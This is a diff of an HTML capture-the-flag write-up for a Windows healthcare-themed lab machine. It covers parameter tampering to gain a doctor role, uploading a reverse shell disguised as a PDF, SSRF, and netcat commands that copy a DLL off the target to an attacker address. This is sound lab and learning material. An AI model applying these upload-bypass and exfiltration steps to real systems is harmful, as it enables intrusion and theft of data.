@@ -66,9 +66,8 @@
 </aside>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-<p><br /><br /></p>
-<ul>
-  <li>nmap scanning
+<p><br /><br />
+nmap scanning
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled.png" alt="Untitled" />
 <br /><br />
@@ -77,9 +76,9 @@ There’s just two ports opened let’s see what’s going on
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_1.png" alt="Untitled" />
 <br /><br />
 A healthcare page with a sign in interface, try sign up a use brupsuite
-<br /><br /></li>
-  <li>There are some parameters we pass away when we sign up, one of those is Acctype which is normally 1 but there’s no sanitization and we can change it to number 2 and create a doctor account.</li>
-  <li>Using burpsuite we catch the access_token which could help us later
+<br /><br />
+There are some parameters we pass away when we sign up, one of those is Acctype which is normally 1 but there’s no sanitization and we can change it to number 2 and create a doctor account.
+Using burpsuite we catch the access_token which could help us later
 <br /><br />
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_2.png" alt="Untitled" />
 <br /><br />
@@ -88,29 +87,29 @@ Using ffuf tool to reach subdomains i found a portal one, we add it at etc/hosts
 <img src="/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_3.png" alt="Untitled" />
 <br /><br />
 A login interface, we don’t have those creds, but may trying using the token we’ve got before can be useful
-<br /><br />
-    <h2 id="2-user-flag">2: User flag</h2>
-    <p><br /><br /></p>
-  </li>
+<br /><br /></p>
+<h2 id="2-user-flag">2: User flag</h2>
+<p><br /><br /></p>
+<ul>
   <li>Once inside go to Upload report where we can send .pdf reports, the system (function upload) check the extension and the header of the file.
 <br /><br />
-    <blockquote>
-      <p>Additionally we use burpsuite to  see existing reports and found a ViewReports.aspx file used to read reports. So we’re gonna use a revshell.aspx to induce later a SSFR on Issue Prescription where there is a panel which enable make requests to the <a href="http://localhost">localhost</a> on 8080 port.</p>
+ Additionally we use burpsuite to  see existing reports and found a ViewReports.aspx file used to read reports. So we’re gonna use a revshell.aspx to induce later a SSFR on Issue Prescription where there is a panel which enable make requests to the <a href="http://localhost">localhost</a> on 8080 port.</li>
+</ul>
 
-      <p><br /><br /></p>
-      <ol>
-        <li>Our rev shell must have %PDF-1.3 on the first line to assure the program will recognize as a pdf.
+<p><br /><br /></p>
+<ol>
+  <li>Our rev shell must have %PDF-1.3 on the first line to assure the program will recognize as a pdf.
 <br /><br /></li>
-        <li>Our rev shell must have a .pdf extension.
+  <li>Our rev shell must have a .pdf extension.
 <br /><br /></li>
-        <li>Send the payload and active the proxy to fix parameters using burpsuite
+  <li>Send the payload and active the proxy to fix parameters using burpsuite
 <br /><br /></li>
-        <li>Change the extension of the file from pdf to aspx → forward→ forward → forward
+  <li>Change the extension of the file from pdf to aspx → forward→ forward → forward
 <br /><br />
 Then we should get a success message and go yo IssuePrescription panel
 <br /><br />
-Open a listening port using netcat</li>
-      </ol>
+    <blockquote>
+      <p>Open a listening port using netcat</p>
 
       <p><br /><br />
 Exploit SSFR 
@@ -121,17 +120,19 @@ User flag on c:\Users\svc_exampanel\Desktop&gt;type user.txt
 <br /><br /></p>
       <h2 id="3-priv-esc">3: Priv esc</h2>
       <p><br /><br /></p>
+      <ul>
+        <li>We found some dll’s on c:\inetpub\ExaminationPanel\ExaminationPanel\bin
+<br /><br /></li>
+        <li>There’s might be something interesting on ExaminationManagement.dll let’s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
+<br /><br />
+          <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp4444</span> <span class="o">&gt;</span>  ExaminationManagement.dll
+.<span class="se">\n</span>c.exe 10.10.14.000 4444 <span class="nt">-w</span> 3 &lt;  ExaminationManagement.dll
+</code></pre></div>          </div>
+        </li>
+      </ul>
     </blockquote>
   </li>
-  <li>We found some dll’s on c:\inetpub\ExaminationPanel\ExaminationPanel\bin
-<br /><br /></li>
-  <li>There’s might be something interesting on ExaminationManagement.dll let’s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
-<br /><br />
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp4444</span> <span class="o">&gt;</span>  ExaminationManagement.dll
-.<span class="se">\n</span>c.exe 10.10.14.000 4444 <span class="nt">-w</span> 3 &lt;  ExaminationManagement.dll
-</code></pre></div>    </div>
-  </li>
-</ul>
+</ol>
 
 <p><br /><br /></p>
 <aside>
